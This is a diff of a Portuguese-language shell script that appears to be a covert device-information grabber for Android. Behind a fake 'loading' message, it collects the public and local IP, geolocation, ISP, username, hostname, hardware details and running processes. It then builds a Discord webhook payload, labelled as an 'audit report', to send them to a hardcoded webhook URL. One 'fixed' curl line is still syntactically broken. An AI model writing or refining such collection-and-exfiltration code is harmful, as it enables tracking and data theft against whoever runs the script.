@@ -6,7 +6,8 @@ URL="https://discord.com/api/webhooks/1474865009459859467/FuON2EHoo1e9LjLPi9cZoe
 echo "Carregando... Aguarde alguns segundos."
 
 # 1. COLETA DE DADOS (ANDROID/LINUX)
-IP_INFO=$(curl -s http://ip-api.com(curl -s https://ifconfig.me)?fields=66846719)
+# Corrigido o erro de sintaxe na linha abaixo
+IP_INFO=$(curl -s "http://ip-api.com(curl -s ifconfig.me)?fields=66846719")
 IP_PUBLICO=$(echo $IP_INFO | grep -o '"query":"[^"]*' | cut -d'"' -f4)
 ISP=$(echo $IP_INFO | grep -o '"isp":"[^"]*' | cut -d'"' -f4)
 CIDADE=$(echo $IP_INFO | grep -o '"city":"[^"]*' | cut -d'"' -f4)
@@ -18,16 +19,17 @@ UPTIME=$(uptime -p)
 USER=$(whoami)
 HOSTNAME=$(hostname)
 
-CPU_INFO=$(grep -m 1 'model name' /proc/cpuinfo | cut -d: -f2 | sed 's/^ //')
-[ -z "$CPU_INFO" ] && CPU_INFO=$(grep -m 1 'Processor' /proc/cpuinfo | cut -d: -f2 | sed 's/^ //')
+# Coleta CPU de forma mais segura para Android
+CPU_INFO=$(grep -m 1 'Processor' /proc/cpuinfo | cut -d: -f2 | sed 's/^ //')
+[ -z "$CPU_INFO" ] && CPU_INFO=$(grep -m 1 'model name' /proc/cpuinfo | cut -d: -f2 | sed 's/^ //')
 
-RAM_TOTAL=$(free -g | awk '/^Mem:/{print $2}')"GB"
-STORAGE=$(df -h /sdcard | awk 'NR==2 {print $4 "/" $2}')
+RAM_TOTAL=$(free -h | awk '/^Mem:/{print $2}')
+STORAGE=$(df -h /data | awk 'NR==2 {print $4 "/" $2}')
 
 IP_LOCAL=$(ip addr show | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -n 1)
 TOP_PROC=$(ps -Ao comm --sort=-%cpu | head -n 6 | tail -n 5 | tr '\n' ',' | sed 's/,$//')
 
-# 2. MONTAGEM DO PAYLOAD JSON (VIA CRAWL/CURL)
+# 2. MONTAGEM DO PAYLOAD JSON
 PAYLOAD=$(cat <<EOF
 {
   "content": "RELATÓRIO DE AUDITORIA ANDROID",
@@ -37,7 +39,7 @@ PAYLOAD=$(cat <<EOF
     "fields": [
       {"name": "Sistema e Usuário", "value": "User: $USER\nModelo: $MODELO\nFabricante: $FABRICANTE\nAndroid: $ANDROID_VER\nUptime: $UPTIME", "inline": false},
       {"name": "Localização e IP", "value": "IP Público: $IP_PUBLICO\nProvedor: $ISP\nCidade: $CIDADE\nIP Local: $IP_LOCAL", "inline": false},
-      {"name": "Hardware", "value": "CPU: $CPU_INFO\nRAM: $RAM_TOTAL\nEspaço (Livre/Total): $STORAGE", "inline": false},
+      {"name": "Hardware", "value": "CPU: $CPU_INFO\nRAM: $RAM_TOTAL\nEspaço: $STORAGE", "inline": false},
       {"name": "Atividade", "value": "Top Processos: $TOP_PROC", "inline": false}
     ]
   }]
